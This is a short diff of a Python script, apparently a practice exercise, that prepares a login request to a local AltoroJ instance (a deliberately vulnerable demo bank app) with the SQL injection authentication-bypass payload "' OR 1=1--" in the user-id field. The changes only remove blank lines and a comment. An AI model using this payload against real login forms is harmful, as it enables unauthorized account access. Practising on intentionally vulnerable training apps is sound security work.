@@ -1,18 +1,12 @@
 import requests
-
 import sys
-
-# URL del login
 
 url = "http://localhost:8080/AltoroJ/doLogin"
 
 
 paramsattack = {
-
     "uid": "' OR 1=1--", 
-
     "passw": "hola", 
-
     "btnSubmit": "Login"
 }
 
